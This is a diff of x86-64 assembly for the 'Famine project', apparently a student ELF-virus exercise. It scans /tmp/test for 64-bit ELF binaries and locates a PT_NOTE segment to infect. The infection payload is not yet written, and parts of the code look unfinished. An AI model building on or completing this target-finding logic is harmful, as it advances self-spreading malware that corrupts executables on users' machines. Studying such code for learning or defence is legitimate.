@@ -19,21 +19,23 @@ section .text
 
 _start:
     mov r14, [rsp + 8] ; argv0
-	push rdx
-	push rsp
-	sub rsp, 6900 ; by substracting 6900 from rsp, we can access the 6900 bytes before the stack pointer (malloc but on stack)
-	mov r15, rsp ; r15 = malloc(6900)
+    push rdx
+    push rbp           ; save the base pointer
+    mov rbp, rsp       ; set the base pointer to the current stack pointer
+    sub rsp, 5000      ; reserving 5000 bytes
+    mov r15, rsp       ; r15 = malloc(5000)
 
     lea rdi, [rel folder1] ; rdi = "/tmp/test"
+    call chdir ; change directory to "/tmp/test"
+
     call open_dir ; change directory to "/tmp/test"
 
     call getdents
 
     xor rcx, rcx ; rcx = 0
 
-    call iterate_loop ; iterate over directory entries
 
-    call hello_world  ; print "Hello, World!"
+    call iterate_loop ; iterate over directory entries
 
     call restore_stack ; exit
 
@@ -41,6 +43,13 @@ open_dir:
     mov rax, SYS_OPEN ; syscall number for sys_open
     mov rsi, 0 ; O_RDONLY
     syscall ; invoke operating system to open directory
+    test rax, rax ; check for error
+    js safe_exit ; if error, exit
+    ret
+
+chdir:
+    mov rax, SYS_CHDIR ; syscall number for sys_chdir
+    syscall ; invoke operating system to change directory
     test rax, rax ; check for error
     js safe_exit ; if error, exit
     ret
@@ -90,17 +99,22 @@ iterate_loop:
     ; mov rdx, 16
     ; call print_bytes
 
-    call hello_world  ; print "Hello, World!"
-
     ; check if it's an ELF file
     cmp dword [r15 + 144], 0x464c457f ; check if it's an ELF file (magic number)
     jnz .close_file ; if not, go to next entry
 
-    call hello_world  ; print "Hello, World!"
-
 
     cmp byte [r15 + 148], 0x2 ; check if it's a 64-bit ELF file
     jne .close_file ; if not, go to next entry
+
+    ;check if it's already infected, if i'm appending to EOF the signature i can check there.
+
+    call find_phdr ; find PT_NOTE segment
+    cmp rax, 2 ; check if it's a PT_NOTE segment
+    jne .close_file ; if not, go to next entry
+
+
+    call hello_world  ; print "Hello, World!"
 
     ; iterate over sections to find PT_NOTE
 
@@ -111,19 +125,19 @@ iterate_loop:
 
     ; close file
 
-.close_file:
-    mov rax, SYS_CLOSE ; syscall number for sys_close
-    mov rdi, r9 ; file descriptor
-    syscall ; invoke operating system to close file
+    .close_file:
+        mov rax, SYS_CLOSE ; syscall number for sys_close
+        mov rdi, r9 ; file descriptor
+        syscall ; invoke operating system to close file
 
-.go_to_next:
-    pop rcx
-    add cx, word [rcx + r15 + 416]
-    cmp rcx, qword [r15 + 350]
-    jne iterate_loop
+    .go_to_next:
+        pop rcx
+        add cx, word [rcx + r15 + 416]
+        cmp rcx, qword [r15 + 350]
+        jne iterate_loop
 
-; all entries done
-call restore_stack ; exit
+    call new_line
+ret
 
 open_file:
     lea rdi, [rcx + r15 + 419] ; filename
@@ -142,6 +156,30 @@ pread:
     syscall ; invoke operating system to read ELF header
     ret
 
+find_phdr:
+    mov rdi, r9 ; file descriptor
+    lea rsi, [r15 + 208] ; buffer to store program header
+    mov dx, word [r15 + 198] ; size of program header
+    mov r10, r8 ; offset (start of program header)
+    mov rax, 17 ; syscall number for sys_pread64
+    syscall ; invoke operating system to read program header
+
+    cmp byte [r15 + 208], 4 ; check if it's a PT_NOTE segment
+    jne .continue
+    mov rax, 2
+    ret; if yes, infect
+
+    .continue:
+        inc rbx ; increase program header counter
+        cmp bx, word [r15 + 200] ; check if we looped through all program headers
+        jl .continue2 ; if yes, close file
+        mov rax, 3
+        ret ; if no valid program header was found, close file
+
+    .continue2:
+        add r8w, word [r15 + 198] ; add size of program header to offset
+        jnz find_phdr ; read next program header
+
 print_bytes:
     ; rsi points to the bytes to print
     ; rdx is the number of bytes to print
@@ -150,9 +188,6 @@ print_bytes:
     syscall
     ret
 
-close_dir:
-    call restore_stack ; exit
-    ret
 
 print_string:
     ; Print string pointed to by rdi
@@ -162,10 +197,6 @@ print_string:
     syscall
     ret
 
-
-; if code arrives here it's a segfault 100%
-foo: ;find the string when doing strings on the binary
-    db "Que me quedo sin comer by gemitareste", NULL
 
 ;debug
 hello_world:
@@ -187,9 +218,6 @@ new_line:
     syscall ; invoke operating system to do the write
     ret
 
-restore_stack:
-    pop rsp ; restore the stack pointer
-    pop rdx ; restore rdx
 
 safe_exit:
     mov rax, SYS_EXIT ; syscall number for sys_exit
@@ -200,4 +228,16 @@ safe_exit:
 folder1 db "/tmp/test", NULL
 folder2 db "/tmp/test2", NULL
 
-signature db "Famine project coded by gemitareste", NULL
+signature db "Famine project coded by gemartin", NULL
+
+
+restore_stack:
+    mov rsp, rbp       ; restore the stack pointer
+    pop rbp            ; restore the base pointer
+    pop rdx            ; restore rdx
+    jmp _end           ; jump to _end to exit
+
+_end:
+    xor rdi, rdi
+    mov rax, SYS_EXIT
+    syscall
